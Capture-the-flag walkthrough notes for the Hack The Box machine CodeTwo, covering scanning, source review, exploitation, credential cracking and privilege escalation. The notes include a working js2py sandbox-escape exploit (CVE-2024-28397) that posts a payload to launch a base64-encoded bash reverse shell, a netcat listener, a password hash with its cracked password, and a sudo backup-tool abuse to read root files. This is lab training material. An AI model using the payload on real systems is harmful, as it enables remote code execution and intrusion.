# Hack The Box: CodeTwo - Comprehensive Notes

Target IP: 10.129.156.112

**Domain:** `codetwo.htb`

## 1. Scanning & Enumeration

### Network Scanning (Nmap)

**Open Ports:**

- `22/tcp` - SSH (OpenSSH 8.2p1 Ubuntu)
    
- `8000/tcp` - HTTP (Gunicorn 20.0.4)
    

**Scan Results:**

```
nmap -p 22,8000 -sCV 10.129.156.112 --stats-every 5
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
# 8000/tcp open  http    Gunicorn 20.0.4
# |_http-server-header: gunicorn/20.0.4
# |_http-title: Welcome to CodeTwo
```

### DNS Configuration

Add the identified domain to `/etc/hosts`:

```
echo '10.129.156.112 codetwo.htb' | sudo tee -a /etc/hosts
```

## 2. Web Enumeration

### Application Analysis (Port 8000)

- **Functionality:** The site allows users to register, login, and access a "Dashboard" which features a JavaScript code editor.
    
- **Endpoints:**
    
    - `/dashboard`: Main interface.
        
    - `/run_code`: Executes the JavaScript code from the editor.
        
    - `/download`: Provides a zip file containing the source code and dependencies.
        

### Source Code Review

Downloading the source via `/download` revealed critical dependency information in `requirements.txt`:

- **Framework:** Flask 3.0.3, Flask-SQLAlchemy 3.1.1
    
- **Vulnerable Library:** **`js2py 0.74`**
    
- **Vulnerability Identified:** **CVE-2024-28397** (js2py Sandbox Escape).
    

## 3. Exploitation (User Access)

### Exploit Strategy (CVE-2024-28397)

The application uses `js2py` to execute user-submitted JavaScript. Version 0.74 is vulnerable to a sandbox escape that allows arbitrary code execution on the host system.

### Proof of Concept (Reverse Shell)

We used a Python script to send a malicious JavaScript payload to the `/run_code` endpoint. The payload bypasses the sandbox to execute a bash reverse shell.

**Exploit Script:**

```
import requests
import json

url = '[http://codetwo.htb:8000/run_code](http://codetwo.htb:8000/run_code)'

# Base64 encoded bash reverse shell:
# bash >& /dev/tcp/10.10.14.XXX/4444 0>&1
js_code = """
let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuNTYvNDQ0NCAwPiYxKSAm|base64 -d|bash";
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;
let obj = a(a(a,"__class__"), "__base__");
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item;
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result;
        }
    }
}
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(result);
result;
"""

payload = {"code": js_code}
headers = {"Content-Type": "application/json"}

r = requests.post(url, data=json.dumps(payload), headers=headers)
print(r.text)
```

**Execution:**

1. Start listener: `nc -lvnp 4444`
    
2. Run exploit script.
    
3. Stabilize shell: `python3 -c "__import__('pty').spawn('/bin/bash')"`
    

## 4. Lateral Movement

### Database Enumeration

Inside the shell as the `app` user, we located the live database file:

- **Location:** `/home/app/app/instance/users.db`
    
- **Technique:** Running `strings` on the database file revealed user data mixed with binary content.
    

### Credential Discovery

The `strings` output contained an MD5 hash for the user `marco`.

- **Hash Found:** `649c9d65a206a75f5abe509fe128bce5` (from strings output snippet)
    
- **Cracked Password:** `sweetangelbabylove`
    

Access:

Successfully logged in via SSH:

ssh marco@codetwo.htb

## 5. Privilege Escalation (Root)

### Sudo Rights Enumeration

Checking sudo privileges for `marco`:

```
sudo -l
# User marco may run the following commands on codetwo:
#     (root) NOPASSWD: /opt/scripts/npbackup-cli
```

### Exploit: Logic Flaw in Backup Tool

The `npbackup-cli` tool reads a configuration file (`npbackup.conf`) to determine which directories to backup. We can manipulate this to read root files.

1. Modify Configuration:
    
    The tool likely reads the local npbackup.conf. We couldn't edit the original, so we created a modified copy.
    
    - _Steps:_ Copy the config, delete the original (if permissions allow) or point the tool to our custom config if the flag allows.
        
    - _Mod:_ Added `/root` to the backup path list in the config file.
        
2. Execution:
    
    Run the backup tool using sudo with the modify/dump flag to print the contents of the root flag.
    

```
sudo /opt/scripts/npbackup-cli -c npbackup.conf -f --dump /root/root.txt
```

**Result:** Root flag retrieved.

**Status:** Machine Completed.